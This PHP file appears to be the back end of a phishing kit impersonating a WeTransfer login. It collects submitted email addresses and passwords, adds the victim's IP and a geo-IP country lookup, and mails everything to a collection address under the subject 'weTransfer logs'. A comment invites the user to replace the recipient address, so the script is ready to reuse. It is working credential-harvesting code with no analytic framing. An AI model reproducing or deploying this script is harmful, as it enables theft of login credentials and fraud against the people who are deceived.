<?php

header('Access-Control-Allow-Origin: *');

if (isset($_POST['user']) && isset($_POST['pass'])) {


    function visitor_country()
    {
        $ip = getenv("REMOTE_ADDR");
        $result = "Unknown";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $country = json_decode(curl_exec($ch))->country;
        if ($country != null) {
            $result = $country;
        }

        return $result;
    }

    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $recipient = "general@owalogins.com"; // Replace your email id here
    $country = visitor_country();
    $ip = getenv("REMOTE_ADDR");

    $date = date('d-m-Y');
        $ip = getenv("REMOTE_ADDR");
        $message = "-----------------++-----------------\n";
        $message.= "Email	: $user\n";
        $message.= "Password	: $pass\n";
        $message.= "IP      	: $ip\n";
        $message.= "Country     : $country\n";
        $message.= "Date      	: $date\n";
        $message.= "-----------------++-----------------\n";
        $subject = "weTransfer logs" . $ip . "\n";
        $headers = "MIME-Version: 1.0\n";
        

        mail($recipient, $subject, $message, $headers);

        echo 1;
}
